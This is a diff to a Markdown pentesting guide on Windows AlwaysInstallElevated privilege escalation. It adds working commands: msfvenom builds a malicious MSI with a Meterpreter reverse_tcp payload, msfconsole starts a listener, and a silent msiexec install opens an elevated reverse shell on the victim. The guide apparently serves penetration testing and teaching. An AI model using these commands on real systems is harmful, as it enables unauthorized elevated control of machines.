@@ -149,7 +149,7 @@ Outcome:
 
 ![AlwaysInstallElevated-SharpUp](/Pictures/AlwaysInstallElevated-SharpUp.png)
 
-:information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations and vulnerabilities on the specified machine.
+:information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations vulnerabilities on the specified machine.
 
 #### Exploitation
 
@@ -157,15 +157,37 @@ Outcome:
 
 ##### Tool Exploitation
 
-To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
+1) To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_address> lport=<port> -f msi > nickvourd.msi
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=<port> EXITFUNC=thread -f msi > nickvourd.msi
 ```
 
 Outcome:
 
+![Msfvenom-Create-MSI](/Pictures/Msfvenom-Create-MSI.png)
 
+2) Configure Metasploit's handler according to your selected MSI payload preferences:
+
+```
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
+```
+
+3) Transfer the malicious MSI file to the victim's machine disk.
+
+4) Initiate the installation process for the malicious MSI package silently without any user interface:
+
+```
+msiexec /quiet /qn /i nickvourd.msi
+```
+
+Outcome:
+
+![AlwaysInstallElevated-New-Session](/Pictures/AlwaysInstallElevated-New-Session.png)
+
+5) Confirm that the new session is with elevated privileges:
+
+![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AlwaysInstallElevated-Elevated-Privileges.png)
 
 ## References
 
